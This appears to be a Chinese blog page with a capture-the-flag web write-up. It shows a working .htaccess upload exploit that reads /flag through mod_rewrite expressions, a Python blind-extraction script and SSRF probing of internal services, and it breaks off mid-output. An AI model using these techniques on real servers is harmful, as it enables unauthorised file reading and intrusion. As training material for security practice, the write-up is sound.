@@ -1,0 +1,982 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>UniCTF-WEB WP - Sauy's corner</title>
+
+  
+    <meta name="description" content="ezUpload&amp;&amp;ezUpload Revenge!!这道题限制 123Max size: 1KBForbidden chars: ? $ &amp; ; | &#96; \ &lt;No PHP code  如果没有ban\ 可以使用换行符来绕过 不过这里禁止了 这里也提示我们上传配置文件 .htaccess .htaccess其实有很多种用法，不止我们平常用到的简单把其他文件当作ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UniCTF-WEB WP">
+<meta property="og:url" content="http://example.com/2026/02/06/UniCTF2026/">
+<meta property="og:site_name" content="Sauy&#39;s corner">
+<meta property="og:description" content="ezUpload&amp;&amp;ezUpload Revenge!!这道题限制 123Max size: 1KBForbidden chars: ? $ &amp; ; | &#96; \ &lt;No PHP code  如果没有ban\ 可以使用换行符来绕过 不过这里禁止了 这里也提示我们上传配置文件 .htaccess .htaccess其实有很多种用法，不止我们平常用到的简单把其他文件当作ph">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/sauy.jpg">
+<meta property="article:published_time" content="2026-02-06T13:50:58.000Z">
+<meta property="article:modified_time" content="2026-02-07T13:34:20.803Z">
+<meta property="article:author" content="Sauy">
+<meta property="article:tag" content="CTF-wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/sauy.jpg">
+  
+  
+  
+  <meta name="keywords" content="CTF-wp">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2026-02-06T21:50:58+08:00","dateModified":"2026-02-07T21:34:20+08:00","datePublished":"2026-02-06T21:50:58+08:00","description":"","headline":"UniCTF-WEB WP","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/02/06/UniCTF2026/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2026/02/06/UniCTF2026/","keywords":"CTF-wp","thumbnailUrl":"/images/miku.PNG","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/sauy.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Sauy's corner</div><div class="sub cap">Die With A Smile</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/02/06/UniCTF2026/"><span class="title">UniCTF-WEB WP</span></a><a class="item title" href="/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="title">next.js之CVE-2025-55182代码审计</span></a><a class="item title" href="/2028/01/22/HTB-Practice/"><span class="title">HTB-wp-长期更新</span></a><a class="item title" href="/2025/12/18/SECCON%20CTF%2014%20Quals-%E5%A4%8D%E7%8E%B0/"><span class="title">SECCON CTF 14 Quals-broken-challenge</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/12/08/xpath-%E6%B3%A8%E5%85%A5/"><span class="title">BackdoorCTF2025之Trust Issues</span></a><a class="item title" href="/2025/12/04/HeroCTF%20v7-WEB/"><span class="title">HeroCTF v7-web</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a><a class="item title" href="/2025/04/27/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><span class="title">CBC字节翻转攻击</span></a><a class="item title" href="/2025/11/11/%5B2025%5DN1CTF%20WP/"><span class="title">N1CTF2025-eezzjs</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-02-06T13:50:58.000Z">2026-02-06</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-02-07T13:34:20.803Z">2026-02-07</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>UniCTF-WEB WP</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="ezUpload-ezUpload-Revenge"><a href="#ezUpload-ezUpload-Revenge" class="headerlink" title="ezUpload&amp;&amp;ezUpload Revenge!!"></a>ezUpload&amp;&amp;ezUpload Revenge!!</h1><p>这道题限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Max size: 1KB</span><br><span class="line">Forbidden chars: ? $ &amp; ; | ` \ &lt;</span><br><span class="line">No PHP code</span><br></pre></td></tr></table></figure>
+
+<p>如果没有ban\ 可以使用换行符来绕过 不过这里禁止了</p>
+<p>这里也提示我们上传配置文件 .htaccess</p>
+<p>.htaccess其实有很多种用法，不止我们平常用到的简单把其他文件当作php来解析的用法，所以其实我们可以拿这个来做很多操作，读文件 文件包含 xss等</p>
+<p>可以参考文章:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7862">Apache的.htaccess利用技巧-先知社区</a></p>
+<p>这里我们使用的是文章里面没有的用法 可以算是使用.htaccess来进行盲注</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On <span class="comment">#启动 Apache 的 URL 重写引擎。这是进行任何重写操作的前提。</span></span><br><span class="line">RewriteCond expr <span class="string">&quot;file(&#x27;/flag&#x27;)=~ /pattern/&quot;</span> <span class="comment">#判断条件 读取/flag文件</span></span><br><span class="line">RewriteRule .* - [R=<span class="number">500</span>] <span class="comment">#返回结果，如果满足 强制服务器返回 500 Internal Server Error 状态码</span></span><br></pre></td></tr></table></figure>
+
+<p>使用的是模块mod_rewrite</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">模块开关 (RewriteEngine)</span><br><span class="line">判定条件 (RewriteCond)</span><br><span class="line">执行规则 (RewriteRule)</span><br></pre></td></tr></table></figure>
+
+<p>于是我们就可以写脚本来一步一步盲注拿到flag了~</p>
+<p>脚本唯一要注意的需要去访问&#x2F;upload下路由确认是不是500 因为.htaccess管的是upload路由</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://url&quot;</span></span><br><span class="line">upload_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/&quot;</span></span><br><span class="line">trigger_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/upload/test&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;U&quot;</span></span><br><span class="line">charset = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;_-&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Starting Blind Injection on /upload/...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    found_char = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line"></span><br><span class="line">        pattern = <span class="string">f&quot;^<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;char&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        htaccess_content = <span class="string">f&quot;&quot;&quot;RewriteEngine On</span></span><br><span class="line"><span class="string">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /<span class="subst">&#123;pattern&#125;</span>/&quot;</span></span><br><span class="line"><span class="string">RewriteRule .* - [R=500]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 1. 上传文件</span></span><br><span class="line">            up_res = requests.post(upload_url, files=files, timeout=<span class="number">5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 2. 请求触发路径，检查是否返回 500</span></span><br><span class="line">            trigger_res = requests.get(trigger_url, timeout=<span class="number">5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> trigger_res.status_code == <span class="number">500</span>:</span><br><span class="line">                flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] Found character: <span class="subst">&#123;char&#125;</span> | Current flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Finished. Final Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>这个官方还提供了不用盲注的手法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;</span><br><span class="line">RewriteRule .* - [E=FLAG_CONTENT:%1]</span><br><span class="line">Header set X-Test-Expr &quot;%&#123;FLAG_CONTENT&#125;e&quot; </span><br></pre></td></tr></table></figure>
+
+<h1 id="Intrasight"><a href="#Intrasight" class="headerlink" title="Intrasight"></a>Intrasight</h1><p>进去就是很明显的ssrf 支持http&#x2F;https和ws</p>
+<p>探测存活端口有</p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260206162414661.png" alt="image-20260206162414661"></p>
+<p>信息收集到 下面两个路由都有东西</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">！http<span class="punctuation">:</span><span class="comment">//127.0.0.1:9000/openapi.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;content-type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;openapi&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ws_render&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">！http<span class="punctuation">:</span><span class="comment">//127.0.0.1:8001/openapi.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;content-type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x-service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin_panel&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;openapi&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin_panel&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;/status&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Status Page&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;operationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;status_page_status_get&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Successful Response&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;application/json&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;/api/debug/config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug Config&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;operationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debug_config_api_debug_config_get&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Successful Response&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;application/json&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;/redirect_ws&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Redirect Ws&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;operationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;redirect_ws_redirect_ws_get&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Successful Response&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;application/json&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>继续信息收集</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">！http<span class="punctuation">:</span><span class="comment">//127.0.0.1:8001/status</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;content-type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/html; charset=utf-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x-service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin_panel&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&lt;html lang=\&quot;zh-CN\&quot;&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n  &lt;title&gt;IntraSight Status&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n  &lt;h3&gt;内部面板在线&lt;/h3&gt;\n  &lt;p&gt;提示：调试信息可查看 /api/debug/config&lt;/p&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">！http<span class="punctuation">:</span><span class="comment">//127.0.0.1:8001/api/debug/config</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;content-type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x-service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin_panel&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ws_internal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ws://127.0.0.1:9000/ws&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">！http<span class="punctuation">:</span><span class="comment">//127.0.0.1:8001/redirect_ws</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">404</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;content-type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span> <span 